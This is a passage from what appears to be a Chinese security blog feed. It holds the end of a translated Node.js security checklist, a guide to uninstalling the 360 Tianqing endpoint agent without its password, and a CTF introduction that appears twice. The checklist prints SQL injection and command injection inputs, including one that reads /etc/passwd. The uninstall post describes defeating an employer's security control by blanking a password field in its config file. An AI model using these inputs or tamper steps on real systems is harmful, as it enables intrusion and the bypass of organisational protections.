class="hljs-string">&quot;submit&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>(以上例子取自<a href="https://www.npmjs.com/package/csurf">csurf模块</a>的文档)</p><h2 id="数据校验"><a href="#数据校验" class="headerlink" title="数据校验"></a>数据校验</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>以下是两种类似的，但是略有不同的攻击方式，一种关于反射型跨站脚本，而另一种则关于存储型跨站脚本攻击。</p><ul><li>反射型XSS攻击 在攻击者向指定的URL的响应HTML中注入可执行的JavaScript代码时发生。</li><li>存储型XSS攻击 在应用存储未经过滤的用户输入时发生。用户输入的代码会在你的应用环境下执行。</li></ul><p>为了防御这类攻击，请确保你总是检查并过滤了用户的输入内容。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>在用户的输入中包含部分或完整的SQL查询语句时，SQL注入就有可能发生。它可能会读取敏感数据，或是直接删除数据。<br>例如：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select title, author <span class="hljs-keyword">from</span> books <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=$<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>以上这个例子中，$id来自于用户输入。用户输入2 or 1&#x3D;1也可以。这个查询可能会变成：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select title, author <span class="hljs-keyword">from</span> books where <span class="hljs-attribute">id</span>=2 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1<br></code></pre></td></tr></table></figure><p>抵御这类攻击的最简单方式是使用参数化查询（parameterized queries）或预处理语句（prepared statements）。<br>如果你正在通过Node.js使用PostgreSQL。那么你可以使用<a href="https://www.npmjs.com/package/pg">node-postgres模块</a>，来创建参数化查询：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">var</span> q = <span class="hljs-string">&#x27;SELECT name FROM books WHERE id = $1&#x27;</span><span class="hljs-punctuation">;</span><br>client.query(q, [<span class="hljs-string">&#x27;3&#x27;</span>], <span class="hljs-keyword">function</span><span class="hljs-params">(err, <span class="hljs-keyword">result</span>)</span> <span class="hljs-comment">&#123;&#125;</span>);<br></code></pre></td></tr></table></figure><p><a href="http://sqlmap.org/">sqlmap</a> 是一个开源的渗透测试工具，自动化检测利用SQL注入漏洞并接管数据库。</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>攻击者使用命令注入来在远程web服务器中运行系统命令。通过命令注入，攻击者甚至可以取得系统的密码。<br>实践中，如果你有一个URL：<br><code>https://example.com/downloads?file=user1.txt</code><br>它可以变成：<br><code>https://example.com/downloads?file=%3Bcat%20/etc/passwd</code><br>在这个例子中，<code>%3B</code>会变成一个分号。所以将会运行多条系统命令。<br><strong>为了预防这类攻击，请确保总是检查过滤了用户的输入内容。</strong><br>我们也可以以Node.js的角度来说：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">child_process.exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, data</span>) &#123;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><p>在<strong>child_process.exec</strong>的底层，它调用了**&#x2F;bin&#x2F;sh<strong>，所以它是一个bash解释器，而不仅仅是只能执行用户程序。<br>当用户的输入是一个反引号或</strong>$()<strong>时，将它们传入这个方法就很危险了,可能会有一个新的命令被攻击者注入了。反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。<br>可以通过使用</strong>child_process.execFile**来解决上面这个问题。</p><h2 id="安全传输"><a href="#安全传输" class="headerlink" title="安全传输"></a>安全传输</h2><h3 id="SSL版本，算法，键长度"><a href="#SSL版本，算法，键长度" class="headerlink" title="SSL版本，算法，键长度"></a>SSL版本，算法，键长度</h3><p>由于HTTP是明文传输的，所以我们需要通过一个SSL&#x2F;TLS通道来加密，即HTTPS。如今高级别的加密方式已被普遍使用，但是，如果在服务端缺乏配置，也可能会导致服务端使用低级别的加密，或不加密。<br>你需要测试：</p><ul><li>密码，密钥和重协商（renegotiation）都已经合法妥善得配置完毕。</li><li>证书的合法性。</li></ul><p>使用如<a href="https://nmap.org/">nmap</a>和<a href="https://github.com/iSECPartners/sslyze">sslyze</a>这样的工具可以使这项工作非常简单。<br>检查证书信息<br><code>nmap --script ssl-cert,ssl-enum-ciphers -p 443,465,993,995 www.example.com</code><br>使用sslyze来检查SSL&#x2F;TSL：<br><code>./sslyze.py --regular example.com:443</code></p><h3 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h3><p>在上文的配置管理章节我们已经对其有了接触 <strong>Strict-Transport-Security</strong>头会强制使用HTTPS来连接服务器。以下是一个Twitter的例子：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">strict</span>-trans<span class="hljs-keyword">port</span>-security:max-age=631138519<br></code></pre></td></tr></table></figure><p>这里的<code>max-age</code>定义了浏览器需要自动将所有HTTP请求转换成HTTPS的有效时间。<br>对于它的测试是非常简单的：<br><code>curl -s -D- https://twitter.com/ | grep -i Strict</code></p><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><h3 id="账号锁定"><a href="#账号锁定" class="headerlink" title="账号锁定"></a>账号锁定</h3><p>账号锁定用于缓和暴力破解带来的拒绝服务方面的影响。实际上，它意味着，当用户尝试了几次登陆并失败后，将在其后的一段时间内，禁止用户的登陆操作。<br>可以使用之前提到的<strong>rate-limiter</strong>来阻止这类攻击。</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>这类攻击主要是由于一些正则表达式，在极端情况下，会变得性能及其糟糕。这些正则被称为恶魔正则（Evil Regexes）：</p><ul><li>对于重复文本进行分组</li><li>在重复分组内<ul><li>重复</li><li>交替重叠</li></ul></li></ul><p><code>([a-zA-Z]+)*</code>，<code>(a+)+</code>或<code>(a|a?)+</code>都是有问题的漏洞正则表达式，在如aaaaaaaaaaaaaaaaaaaaaaaa! 这样的输入面前，都是脆弱的。这会引起大量的计算。更多详情可以参考<a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">正则表达式ReDos</a></p><p>可以使用Node.js工具<a href="https://www.npmjs.com/package/safe-regex">safe-regex</a>这检测你的正则表达式，它可能会误报，所以小心使用。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ <span class="hljs-keyword">node</span> <span class="hljs-title">safe</span>.js &#x27;(beep|boop)*&#x27;<br><span class="hljs-literal">true</span><br>$ <span class="hljs-keyword">node</span> <span class="hljs-title">safe</span>.js &#x27;(a+)&#123;<span class="hljs-number">10</span>&#125;&#x27;<br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="错误码，堆栈信息"><a href="#错误码，堆栈信息" class="headerlink" title="错误码，堆栈信息"></a>错误码，堆栈信息</h3><p>一些错误场景可能会导致应用泄露底层的应用架构信息，如：<strong>X-Powered-By:Express</strong>。<br>堆栈信息可能自己本身并没有什么用，但它经常能泄露一些攻击者非常感兴趣的信息。将堆栈信息返回出来是非常不好的做法。你需要将它们记录在日志中，而不是展示给用户。</p><h2 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h2><p>能力越大，责任越大。NPM有这许多可以现成使用的模块，但是方便的代价是：你需要检查这些包本身是否存在安全问题。</p><h3 id="Node安全项目"><a href="#Node安全项目" class="headerlink" title="Node安全项目"></a>Node安全项目</h3><p>幸运的是Node Security project(nsp)是一个非常棒的工具，来检查你使用的模块是否是易被一些已知的手段攻击的。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> i nsp -g<br><span class="hljs-comment"># either audit the shrinkwrap</span><br>nsp audit-shrinkwrap<br><span class="hljs-comment"># or the package.json</span><br>nsp audit-package<br></code></pre></td></tr></table></figure><p>你还可以使用 <a href="https://link.juejin.im/?target=https://www.npmjs.com/package/requiresafe">requireSafe</a> 来帮你做这件事。</p><h3 id="Snyk"><a href="#Snyk" class="headerlink" title="Snyk"></a>Snyk</h3><p>Snyk和Node安全项目相似，但是它的目标不仅是提供工具发现漏洞，还能在你的项目仓库中解决相关安全问题。<br>可以尝试一下<a href="https://link.juejin.im/?target=https://snyk.io">snyk.io</a>。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><h2 id="这个清单主要根据OWASP维护的Web-Application-Security-Testing-Cheat-Sheet所列。在客户侧做代码审计，发现客户使用的是金融企业很少使用的nodejs作为开发框架，对于部分安全人员可能很陌生，网上也有部分使用机器翻译的文章，个人感觉比较生涩，所以抽空翻译了一下，方便以后查阅。"><a href="#这个清单主要根据OWASP维护的Web-Application-Security-Testing-Cheat-Sheet所列。在客户侧做代码审计，发现客户使用的是金融企业很少使用的nodejs作为开发框架，对于部分安全人员可能很陌生，网上也有部分使用机器翻译的文章，个人感觉比较生涩，所以抽空翻译了一下，方便以后查阅。" class="headerlink" title="这个清单主要根据OWASP维护的Web Application Security Testing Cheat Sheet所列。在客户侧做代码审计，发现客户使用的是金融企业很少使用的nodejs作为开发框架，对于部分安全人员可能很陌生，网上也有部分使用机器翻译的文章，个人感觉比较生涩，所以抽空翻译了一下，方便以后查阅。"></a>这个清单主要根据OWASP维护的<a href="https://link.juejin.im/?target=https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet">Web Application Security Testing Cheat Sheet</a>所列。<br>在客户侧做代码审计，发现客户使用的是金融企业很少使用的nodejs作为开发框架，对于部分安全人员可能很陌生，网上也有部分使用机器翻译的文章，个人感觉比较生涩，所以抽空翻译了一下，方便以后查阅。</h2><p>原文链接<a href="https://blog.risingstack.com/node-js-security-checklist/">https://blog.risingstack.com/node-js-security-checklist/</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移除360天擎</title>
    <link href="/2019/06/01/2019-06-01-remove-360-tianqing/"/>
    <url>/2019/06/01/2019-06-01-remove-360-tianqing/</url>
    
    <content type="html"><![CDATA[<h1 id="无密码卸载360天擎"><a href="#无密码卸载360天擎" class="headerlink" title="无密码卸载360天擎"></a>无密码卸载360天擎</h1><hr><p>不少甲方爸爸使用360天擎这款终端安全软件，为了接入客户的内网，被迫安装。安装后，电脑各种卡顿，卸载还需要密码，这就难受了，琢磨了一下，找出了两个卸载方法，供各位参考</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><h3 id="找到360的安装目录"><a href="#找到360的安装目录" class="headerlink" title="找到360的安装目录"></a>找到360的安装目录</h3><p>360天擎安装目录很好找，通常都安装在C盘的Program Files或者Program Files (x86)，如果你在安装的时候指定了安装目录请绕过此步</p><h3 id="准备一个PE系统或者linux系统"><a href="#准备一个PE系统或者linux系统" class="headerlink" title="准备一个PE系统或者linux系统"></a>准备一个PE系统或者linux系统</h3><p>由于360安装目录下的文件禁止被更改，个人学艺不精，不清楚如何在windows上修改对应的文件，只能通过PE或者linux系统对360的配置文件进行修改</p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>360的配置文件位于360\360Safe\EntClient\conf\ExtBase.dat，将其中的uipass置空即可<br><img src="/img/360sage-config.png" alt="360sage-config.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><h3 id="粉碎相关配置文件"><a href="#粉碎相关配置文件" class="headerlink" title="粉碎相关配置文件"></a>粉碎相关配置文件</h3><p>使用第三方的文件粉碎器，强行移除360\360Safe\EntClient\conf\ExtBase.dat文件</p><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>1、重新进入windows系统后，进入360的安装目录，找到360Safe\uninst.exe，点击运行，然后进行卸载即可<br><img src="/img/360-uninstall.png" alt="360-uninstall.png"><br>2、或者直接使用控制面板里的程序和功能模块下的卸载或更改程序进行卸载<br><img src="/img/360-uninstall-control.png" alt="360-uninstall-control.png"></p><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><p>卸载完成以后需要重启，重启以后才能移除剩余文件</p><hr><p>附：本文只是提供网友一个卸载方法，如有任何侵权，请及时联系本人。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF基础介绍</title>
    <link href="/2019/01/20/2019-01-20-ctf-about/"/>
    <url>/2019/01/20/2019-01-20-ctf-about/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-基础"><a href="#CTF-基础" class="headerlink" title="CTF 基础"></a>CTF 基础</h1><hr><p>CTF(Capture The Flag，夺旗赛），在网络安全领域中指安全人员之间进行技术竞技的一种比赛。</p><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><h2 id="CTF赛事"><a href="#CTF赛事" class="headerlink" title="CTF赛事"></a>CTF赛事</h2><blockquote><ul><li>ISCC(信息安全与对抗技术竞赛)</li><li>ISG（中国网络安全技能竞赛）</li><li>XCTF（XCTF国际网络攻防联赛）</li><li>…</li></ul></blockquote><h2 id="CTF竞赛模式"><a href="#CTF竞赛模式" class="headerlink" title="CTF竞赛模式"></a>CTF竞赛模式</h2><blockquote><ul><li>解题模式</li><li>攻防模式</li><li>防御模式</li><li>混合模式</li><li>综合模式</li></ul></blockquote><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>常见于线上选拨比赛，参赛队伍需要运用安全相关的理论知识及技术来解决问题，并获取一串被称为flag的字符串进行提交，以此来获取分数<br>特点：每一道题目都有相应的分值，同一类题目中难度越大分值越高。</p><h3 id="综合模式"><a href="#综合模式" class="headerlink" title="综合模式"></a>综合模式</h3><p>综合靶场贴合行业用户业务系统架构，整个综合靶场由多台漏洞靶机构成。用户可以有多个攻防入口多种攻防路径选择，让参赛选手在大型真实的行业业务系统中进行挑战，难度较高。</p><h3 id="攻防模式"><a href="#攻防模式" class="headerlink" title="攻防模式"></a>攻防模式</h3><p>每个参赛队伍既是攻击者又是防御者，保证自己的服务器不被攻击、服务不中断。通过漏洞挖掘、流量分析等方式找到可利用的漏洞，攻击其他队伍的服务器。</p><h3 id="防御模式"><a href="#防御模式" class="headerlink" title="防御模式"></a>防御模式</h3><p>每个参赛队伍均是防御者，保证自己的服务器不被攻击、服务不中断。</p><h3 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h3><p>结合解题模式与攻防模式的CTF赛制，如通过解题模式获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏。</p><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于国内重视网络安全法，从18年开始出现爆发时增长态势，各种层次不齐的CTF赛事层出不穷。</p><h3 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h3><blockquote><ul><li>线上预选赛</li><li>线下半决赛</li><li>线下总决赛</li></ul></blockquote><h3 id="价值体现"><a href="#价值体现" class="headerlink" title="价值体现"></a>价值体现</h3><p>行业选拔人才，提升重要行业部门，科研院校的网络安全实战能力；行业提高安全部门的入侵检测和防御能力，增加公司荣誉；个人提高就业机会和增加零花钱。</p><h2 id="CTF-题型"><a href="#CTF-题型" class="headerlink" title="CTF 题型"></a>CTF 题型</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>SQL,XSS,文件上传，ssrf，远程命令执行等等</p><blockquote><ul><li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li><li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li><li>三、花式玩弄几个PHP特性，包括弱类型，strpos和&#x3D;&#x3D;&#x3D;，反序列化+destruct、\0截断、iconv截断、</li><li>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小</li><li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak</li><li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% <script language=php>、花式解析漏洞、</li><li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li><li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li><li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li><li>十、社工，包括花式查社工库、微博、QQ签名、whois</li><li>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li><li>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li><li>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</li><li>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li><li>十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li><li>以上参考自：<a href="https://weibo.com/ttarticle/p/show?id=2309403980950244591011">https://weibo.com/ttarticle/p/show?id=2309403980950244591011</a></li></ul></blockquote><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><ul><li>攻击远程服务器的服务</li><li>会提供服务程序的二进制文件</li><li>分析漏洞并写出exp</li><li>栈溢出、堆溢出</li><li>绕过保护机制（ASLR,NX等）<br>给出一个有漏洞的程序，参赛者通过二进制漏洞挖掘与利用，如静态分析和动态分析来攻破该运行程序。如利用Buffer Overflow、Format String、命令执行等。使用的工具有：pwntools,IDA,GDB.....</li></ul><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>主要考察选手对于源代码及二进制逆向分析能力，要求熟悉操作系统、汇编语言、加解密等知识</p><ul><li>逆向，破解程序的算法来得到程序中的flag</li><li>对抗反调试、代码混淆等等<br>使用的工具有：IDA,onlydbg,GDB,Dex2jar.....</li></ul><h3 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a>移动安全</h3><p>移动应用安全</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li>Stego（隐写）<br>1.图片隐写<br>文件拼接，文件修复，LSB,EXIF,图片处理，图片内容等等。<br>2.音频隐写<br>隐藏在声音里（顺序、逆序）、隐藏在数据里、隐藏在声波和频谱里，常用的工具有：Audacity,Matlab.silienteye。<br>3,视频隐写<br>主要是在metadata，或者在帧里面，帧转化成图片隐写<br>主要工具：strings/010Editor、ffmpeg</li><li>CRYPTO（解密）<br>常见编码、代码混淆与加密、古典密码、单向散列、现代密码、自定义加密、特殊密码</li><li>PPC（编程）<br>考察快速编程能力。</li><li>Forensics（取证）<br>1、网络流量分析，从数据流中取字符串，从数据流中取文件，从协议相关数据提取。<br>2、日志分析，SQL注入日志分析，结合web进行漏洞分析、WEBSHELL的查找、用户访问敏感路径的查找。<br>3、Office取证<br>藏在解压文件中、藏在doc十六进制中、文件爆破</li><li>Other（其他）<br>文件修复、密码爆破、伪加密位、明文攻击、CRC32碰撞</li></ul><h2 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h2><p>CTF学习需要掌握计算机基础、web应用、数据库等知识，详细请参考[CTF学习]（<a href="https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/%EF%BC%89">https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/）</a></p><hr><p>附：有什么问题请及时联系本人，本人CTF新人，多谢关照。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF基础介绍</title>
    <link href="/2019/01/20/2019-03-30-burpsuite-detail/"/>
    <url>/2019/01/20/2019-03-30-burpsuite-detail/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-基础"><a href="#CTF-基础" class="headerlink" title="CTF 基础"></a>CTF 基础</h1><hr><p>CTF(Capture The Flag，夺旗赛），在网络安全领域中指安全人员之间进行技术竞技的一种比赛。</p><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><h2 id="CTF赛事"><a href="#CTF赛事" class="headerlink" title="CTF赛事"></a>CTF赛事</h2><blockquote><ul><li>ISCC(信息安全与对抗技术竞赛)</li><li>ISG（中国网络安全技能竞赛）</li><li>XCTF（XCTF国际网络攻防联赛）</li><li>…</li></ul></blockquote><h2 id="CTF竞赛模式"><a href="#CTF竞赛模式" class="headerlink" title="CTF竞赛模式"></a>CTF竞赛模式</h2><blockquote><ul><li>解题模式</li><li>攻防模式</li><li>防御模式</li><li>混合模式</li><li>综合模式</li></ul></blockquote><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>常见于线上选拨比赛，参赛队伍需要运用安全相关的理论知识及技术来解决问题，并获取一串被称为flag的字符串进行提交，以此来获取分数<br>特点：每一道题目都有相应的分值，同一类题目中难度越大分值越高。</p><h3 id="综合模式"><a href="#综合模式" class="headerlink" title="综合模式"></a>综合模式</h3><p>综合靶场贴合行业用户业务系统架构，整个综合靶场由多台漏洞靶机构成。用户可以有多个攻防入口多种攻防路径选择，让参赛选手在大型真实的行业业务系统中进行挑战，难度较高。</p><h3 id="攻防模式"><a href="#攻防模式" class="headerlink" title="攻防模式"></a>攻防模式</h3><p>每个参赛队伍既是攻击者又是防御者，保证自己的服务器不被攻击、服务不中断。通过漏洞挖掘、流量分析等方式找到可利用的漏洞，攻击其他队伍的服务器。</p><h3 id="防御模式"><a href="#防御模式" class="headerlink" title="防御模式"></a>防御模式</h3><p>每个参赛队伍均是防御者，保证自己的服务器不被攻击、服务不中断。</p><h3 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h3><p>结合解题模式与攻防模式的CTF赛制，如通过解题模式获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏。</p><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于国内重视网络安全法，从18年开始出现爆发时增长态势，各种层次不齐的CTF赛事层出不穷。</p><h3 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h3><blockquote><ul><li>线上预选赛</li><li>线下半决赛</li><li>线下总决赛</li></ul></blockquote><h3 id="价值体现"><a href="#价值体现" class="headerlink" title="价值体现"></a>价值体现</h3><p>行业选拔人才，提升重要行业部门，科研院校的网络安全实战能力；行业提高安全部门的入侵检测和防御能力，增加公司荣誉；个人提高就业机会和增加零花钱。</p><h2 id="CTF-题型"><a href="#CTF-题型" class="headerlink" title="CTF 题型"></a>CTF 题型</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>SQL,XSS,文件上传，ssrf，远程命令执行等等</p><blockquote><ul><li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li><li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li><li>三、花式玩弄几个PHP特性，包括弱类型，strpos和&#x3D;&#x3D;&#x3D;，反序列化+destruct、\0截断、iconv截断、</li><li>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小</li><li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak</li><li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% <script language=php>、花式解析漏洞、</li><li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li><li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li><li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li><li>十、社工，包括花式查社工库、微博、QQ签名、whois</li><li>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li><li>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li><li>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</li><li>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li><li>十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li><li>以上参考自：<a href="https://weibo.com/ttarticle/p/show?id=2309403980950244591011">https://weibo.com/ttarticle/p/show?id=2309403980950244591011</a></li></ul></blockquote><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><ul><li>攻击远程服务器的服务</li><li>会提供服务程序的二进制文件</li><li>分析漏洞并写出exp</li><li>栈溢出、堆溢出</li><li>绕过保护机制（ASLR,NX等）<br>给出一个有漏洞的程序，参赛者通过二进制漏洞挖掘与利用，如静态分析和动态分析来攻破该运行程序。如利用Buffer Overflow、Format String、命令执行等。使用的工具有：pwntools,IDA,GDB.....</li></ul><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>主要考察选手对于源代码及二进制逆向分析能力，要求熟悉操作系统、汇编语言、加解密等知识</p><ul><li>逆向，破解程序的算法来得到程序中的flag</li><li>对抗反调试、代码混淆等等<br>使用的工具有：IDA,onlydbg,GDB,Dex2jar.....</li></ul><h3 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a>移动安全</h3><p>移动应用安全</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li>Stego（隐写）<br>1.图片隐写<br>文件拼接，文件修复，LSB,EXIF,图片处理，图片内容等等。<br>2.音频隐写<br>隐藏在声音里（顺序、逆序）、隐藏在数据里、隐藏在声波和频谱里，常用的工具有：Audacity,Matlab.silienteye。<br>3,视频隐写<br>主要是在metadata，或者在帧里面，帧转化成图片隐写<br>主要工具：strings/010Editor、ffmpeg</li><li>CRYPTO（解密）<br>常见编码、代码混淆与加密、古典密码、单向散列、现代密码、自定义加密、特殊密码</li><li>PPC（编程）<br>考察快速编程能力。</li><li>Forensics（取证）<br>1、网络流量分析，从数据流中取字符串，从数据流中取文件，从协议相关数据提取。<br>2、日志分析，SQL注入日志分析，结合web进行漏洞分析、WEBSHELL的查找、用户访问敏感路径的查找。<br>3、Office取证<br>藏在解压文件中、藏在doc十六进制中、文件爆破</li><li>Other（其他）<br>文件修复、密码爆破、伪加密位、明文攻击、CRC32碰撞</li></ul><h2 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h2><p>CTF学习需要掌握计算机基础、web应用、数据库等知识，详细请参考[CTF学习]（<a href="https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/%EF%BC%89">https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/）</a></p><hr><p>附：有什么问题请及时联系本人，本人CTF新人，多谢关照。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF学习</title>
    <link href="/2018/07/19/2018-07-19-awesome-ctf-learning-lists/"/>
    <url>/2018/07/19/2018-07-19-awesome-ctf-learning-lists/</url>
    
